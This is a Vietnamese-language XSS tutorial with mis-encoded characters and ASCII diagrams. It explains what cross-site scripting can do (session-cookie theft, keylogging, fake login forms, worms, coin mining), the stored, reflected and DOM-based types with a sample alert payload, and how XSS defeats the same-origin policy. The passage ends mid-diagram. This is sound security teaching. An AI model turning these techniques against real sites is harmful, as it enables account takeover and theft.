# Cross-Site Scripting (XSS) â€” Deep Dive ğŸ”“

> **Chá»§ Ä‘á»**: XSS â€” Lá»— há»•ng báº£o máº­t nguy hiá»ƒm nháº¥t trong á»©ng dá»¥ng Web!
>
> **PhÆ°Æ¡ng phÃ¡p**: PhÃ¢n tÃ­ch tá»«ng loáº¡i táº¥n cÃ´ng â†’ viáº¿t láº¡i Tá»ª Äáº¦U báº±ng tay â†’ giáº£i thÃ­ch cá»±c ká»³ chi tiáº¿t!
>
> **NguyÃªn táº¯c**: KHÃ”NG dÃ¹ng thÆ° viá»‡n! Tá»± viáº¿t sanitizer, escaper, scanner tá»« Ä‘áº§u!

---

## Â§1. Tá»•ng Quan â€” XSS LÃ  GÃ¬?

### 1.1. Äá»‹nh NghÄ©a

```
  XSS â€” CROSS-SITE SCRIPTING LÃ€ GÃŒ?
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  XSS = Cross-Site Scripting                            â”‚
  â”‚                                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Káº» táº¥n cÃ´ng CHÃˆN (inject) mÃ£ JavaScript       â”‚  â”‚
  â”‚  â”‚  Ä‘á»™c háº¡i vÃ o trang web MÃ€ NGÆ¯á»œI DÃ™NG KHÃC      â”‚  â”‚
  â”‚  â”‚  Ä‘ang xem!                                       â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â†’ Code cá»§a hacker cháº¡y TRONG BROWSER            â”‚  â”‚
  â”‚  â”‚    cá»§a Náº N NHÃ‚N!                                â”‚  â”‚
  â”‚  â”‚  â†’ Vá»›i QUYá»€N Háº N cá»§a trang web gá»‘c!            â”‚  â”‚
  â”‚  â”‚  â†’ Hacker khÃ´ng cáº§n hack server!                 â”‚  â”‚
  â”‚  â”‚  â†’ Chá»‰ cáº§n trick BROWSER cháº¡y code!             â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  Táº I SAO Gá»ŒI LÃ€ "CROSS-SITE"?                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  "Cross-Site" = "XuyÃªn qua trang web"            â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  Hacker tá»« TRANG A (evil.com)                    â”‚  â”‚
  â”‚  â”‚  â†’ ChÃ¨n code vÃ o TRANG B (bank.com)             â”‚  â”‚
  â”‚  â”‚  â†’ Code cháº¡y nhÆ° thá»ƒ tá»« TRANG B!                â”‚  â”‚
  â”‚  â”‚  â†’ Browser tin tÆ°á»Ÿng code Ä‘Ã³!                    â”‚  â”‚
  â”‚  â”‚  â†’ Hacker truy cáº­p dá»¯ liá»‡u cá»§a TRANG B!        â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  Táº I SAO VIáº¾T Táº®T "XSS" MÃ€ KHÃ”NG PHáº¢I "CSS"?        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â†’ "CSS" Ä‘Ã£ bá»‹ dÃ¹ng cho Cascading Style Sheets! â”‚  â”‚
  â”‚  â”‚  â†’ NÃªn dÃ¹ng "X" thay "C" â†’ XSS!                â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 1.2. XSS Nguy Hiá»ƒm NhÆ° Tháº¿ NÃ o?

```
  XSS CÃ“ THá»‚ LÃ€M GÃŒ?
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  â‘  Äáº®P Cáº®P COOKIE & SESSION:                         â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â†’ Láº¥y session cookie cá»§a náº¡n nhÃ¢n!             â”‚  â”‚
  â”‚  â”‚  â†’ ÄÄƒng nháº­p vÃ o tÃ i khoáº£n Náº N NHÃ‚N!           â”‚  â”‚
  â”‚  â”‚  â†’ KhÃ´ng cáº§n biáº¿t máº­t kháº©u!                     â”‚  â”‚
  â”‚  â”‚  â†’ Chuyá»ƒn tiá»n, Ä‘á»c email, xÃ³a dá»¯ liá»‡u!       â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  â‘¡ KEYLOGGER â€” GHI Láº I Má»ŒI PHÃM GÃ•:                 â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â†’ ChÃ¨n event listener lÃªn document!            â”‚  â”‚
  â”‚  â”‚  â†’ Ghi láº¡i username, password, credit card!     â”‚  â”‚
  â”‚  â”‚  â†’ Gá»­i vá» server cá»§a hacker!                    â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  â‘¢ PHISHING â€” GIáº¢ Máº O GIAO DIá»†N:                     â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â†’ Thay Ä‘á»•i ná»™i dung trang web!                 â”‚  â”‚
  â”‚  â”‚  â†’ Hiá»ƒn thá»‹ form Ä‘Äƒng nháº­p GIáº¢!                â”‚  â”‚
  â”‚  â”‚  â†’ User nháº­p tháº­t â†’ gá»­i cho hacker!            â”‚  â”‚
  â”‚  â”‚  â†’ URL váº«n lÃ  bank.com â†’ user tin tÆ°á»Ÿng!       â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  â‘£ WORM â€” Tá»° LAN TRUYá»€N:                              â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â†’ XSS tá»± Ä‘á»™ng Ä‘Äƒng bÃ i chá»©a XSS!             â”‚  â”‚
  â”‚  â”‚  â†’ Báº¡n bÃ¨ xem bÃ i â†’ bá»‹ nhiá»…m!                 â”‚  â”‚
  â”‚  â”‚  â†’ Báº¡n bÃ¨ TIáº¾P Tá»¤C lan truyá»n!                â”‚  â”‚
  â”‚  â”‚  â†’ VÃ­ dá»¥: Samy Worm (MySpace, 2005)            â”‚  â”‚
  â”‚  â”‚    â†’ 1 triá»‡u user bá»‹ nhiá»…m trong 20 giá»!      â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  â‘¤ CRYPTOCURRENCY MINING:                              â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â†’ ChÃ¨n script Ä‘Ã o coin vÃ o trang!              â”‚  â”‚
  â”‚  â”‚  â†’ CPU náº¡n nhÃ¢n Ä‘Ã o coin cho hacker!            â”‚  â”‚
  â”‚  â”‚  â†’ Náº¡n nhÃ¢n chá»‰ tháº¥y mÃ¡y cháº­m!                â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 1.3. Ba Loáº¡i XSS ChÃ­nh

```
  3 LOáº I XSS â€” PHÃ‚N LOáº I THEO CÃCH Táº¤N CÃ”NG:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚ Loáº¡i          â”‚ LÆ°u trá»¯  â”‚ Nguá»“n    â”‚ Äá»™ nguy    â”‚  â”‚
  â”‚  â”‚               â”‚ server?  â”‚ payload  â”‚ hiá»ƒm       â”‚  â”‚
  â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â”‚
  â”‚  â”‚ Stored XSS    â”‚ CÃ“!      â”‚ Database â”‚ â˜…â˜…â˜…â˜…â˜…     â”‚  â”‚
  â”‚  â”‚ (Persistent)  â”‚ LÆ°u DB   â”‚ â†’ HTML  â”‚ Cao nháº¥t!  â”‚  â”‚
  â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â”‚
  â”‚  â”‚ Reflected XSS â”‚ KHÃ”NG!   â”‚ URL      â”‚ â˜…â˜…â˜…â˜…â˜†     â”‚  â”‚
  â”‚  â”‚ (Non-persist) â”‚ 1 láº§n    â”‚ â†’ HTML  â”‚ Cao!       â”‚  â”‚
  â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â”‚
  â”‚  â”‚ DOM-based XSS â”‚ KHÃ”NG!   â”‚ URL      â”‚ â˜…â˜…â˜…â˜†â˜†     â”‚  â”‚
  â”‚  â”‚ (Client-side) â”‚ Ko qua   â”‚ â†’ DOM   â”‚ Trung bÃ¬nh â”‚  â”‚
  â”‚  â”‚               â”‚ server!  â”‚ JS xá»­ lÃ½â”‚            â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  SÆ  Äá»’ Tá»”NG QUAN:                                     â”‚
  â”‚                                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                          â”‚
  â”‚  â”‚ HACKER   â”‚                                          â”‚
  â”‚  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜                                          â”‚
  â”‚       â”‚ ChÃ¨n payload: <script>alert('XSS')</script>   â”‚
  â”‚       â”‚                                                â”‚
  â”‚       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚
  â”‚       â–¼                   â–¼                    â–¼       â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚ Stored  â”‚       â”‚Reflected â”‚       â”‚ DOM-based  â”‚  â”‚
  â”‚  â”‚ XSS     â”‚       â”‚ XSS      â”‚       â”‚ XSS        â”‚  â”‚
  â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â”‚
  â”‚  â”‚ LÆ°u vÃ o â”‚       â”‚ URL chá»©a â”‚       â”‚ JS phÃ­a    â”‚  â”‚
  â”‚  â”‚ DB!     â”‚       â”‚ payload  â”‚       â”‚ client Ä‘á»c â”‚  â”‚
  â”‚  â”‚ â†“       â”‚       â”‚ â†“        â”‚       â”‚ URL/DOM    â”‚  â”‚
  â”‚  â”‚ Ai vÃ o  â”‚       â”‚ Server   â”‚       â”‚ â†“          â”‚  â”‚
  â”‚  â”‚ trang   â”‚       â”‚ pháº£n há»“i â”‚       â”‚ ChÃ¨n vÃ o   â”‚  â”‚
  â”‚  â”‚ Ä‘á»u bá»‹! â”‚       â”‚ payload  â”‚       â”‚ DOM trá»±c   â”‚  â”‚
  â”‚  â”‚         â”‚       â”‚ vÃ o HTML â”‚       â”‚ tiáº¿p!      â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚       â”‚                   â”‚                    â”‚       â”‚
  â”‚       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â”‚
  â”‚                           â–¼                            â”‚
  â”‚                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
  â”‚                    â”‚  Náº N NHÃ‚N   â”‚                     â”‚
  â”‚                    â”‚  Browser    â”‚                     â”‚
  â”‚                    â”‚  cháº¡y code  â”‚                     â”‚
  â”‚                    â”‚  cá»§a hacker!â”‚                     â”‚
  â”‚                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Â§2. Same-Origin Policy â€” Táº¡i Sao XSS Nguy Hiá»ƒm?

### 2.1. Same-Origin Policy (SOP) LÃ  GÃ¬?

```
  SAME-ORIGIN POLICY â€” HÃ€NG RÃ€O Báº¢O Vá»† Cá»¦A BROWSER:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  SOP = Same-Origin Policy = ChÃ­nh sÃ¡ch cÃ¹ng nguá»“n gá»‘câ”‚
  â”‚                                                        â”‚
  â”‚  "ORIGIN" = Protocol + Host + Port                     â”‚
  â”‚                                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  https://www.bank.com:443/account                â”‚  â”‚
  â”‚  â”‚  â”œâ”€â”€â”€â”€â”€â”¤ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”œâ”€â”€â”€â”¤                     â”‚  â”‚
  â”‚  â”‚  Protocol    Host       Port                     â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â†’ Origin = "https://www.bank.com:443"          â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  SO SÃNH ORIGIN:                                       â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  https://bank.com   vs  https://bank.com        â”‚  â”‚
  â”‚  â”‚  â†’ CÃ™NG origin! âœ…                              â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  https://bank.com   vs  http://bank.com         â”‚  â”‚
  â”‚  â”‚  â†’ KHÃC protocol! âŒ                            â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  https://bank.com   vs  https://evil.com        â”‚  â”‚
  â”‚  â”‚  â†’ KHÃC host! âŒ                                â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  https://bank.com   vs  https://bank.com:8080   â”‚  â”‚
  â”‚  â”‚  â†’ KHÃC port! âŒ                                â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  https://bank.com   vs  https://api.bank.com    â”‚  â”‚
  â”‚  â”‚  â†’ KHÃC host (subdomain)! âŒ                    â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 2.2. SOP Báº£o Vá»‡ NhÆ° Tháº¿ NÃ o?

```
  SOP â€” NGÄ‚N CHáº¶N TRUY Cáº¬P CROSS-ORIGIN:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  KHÃ”NG CÃ“ SOP:                                         â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  evil.com má»Ÿ iframe â†’ bank.com                  â”‚  â”‚
  â”‚  â”‚  evil.com Ä‘á»c cookie bank.com!                   â”‚  â”‚
  â”‚  â”‚  evil.com Ä‘á»c form bank.com!                     â”‚  â”‚
  â”‚  â”‚  evil.com gá»­i request tá»›i bank.com!              â”‚  â”‚
  â”‚  â”‚  â†’ THáº¢M Há»ŒA! âŒ                                â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  CÃ“ SOP:                                               â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  evil.com má»Ÿ iframe â†’ bank.com                  â”‚  â”‚
  â”‚  â”‚  evil.com Ä‘á»c cookie bank.com?  â†’ Bá»Š CHáº¶N! âŒ  â”‚  â”‚
  â”‚  â”‚  evil.com Ä‘á»c DOM bank.com?     â†’ Bá»Š CHáº¶N! âŒ  â”‚  â”‚
  â”‚  â”‚  evil.com Ä‘á»c response bank.com?â†’ Bá»Š CHáº¶N! âŒ  â”‚  â”‚
  â”‚  â”‚  â†’ AN TOÃ€N! âœ…                                  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  NHÆ¯NG XSS PHÃ Vá»  SOP!                                â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  XSS chÃ¨n code VÃ€O TRONG bank.com!              â”‚  â”‚
  â”‚  â”‚  â†’ Code cháº¡y TRONG origin bank.com!             â”‚  â”‚
  â”‚  â”‚  â†’ SOP tháº¥y: "Code nÃ y tá»« bank.com!"            â”‚  â”‚
  â”‚  â”‚  â†’ SOP: "OK! Cho phÃ©p truy cáº­p!"               â”‚  â”‚
  â”‚  â”‚  â†’ Hacker Äá»ŒC cookie, DOM, gá»­i request!        â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  âš  XSS = BYPASS Same-Origin Policy!             â”‚  â”‚
  â”‚  â”‚  â†’ Code hacker GIá»NG code chÃ­nh chá»§!            â”‚  â”‚
  â”‚  â”‚  â†’ Browser KHÃ”NG PHÃ‚N BIá»†T ÄÆ¯á»¢C!                â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

```
  Táº I SAO XSS BYPASS ÄÆ¯á»¢C SOP â€” SÆ  Äá»’:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
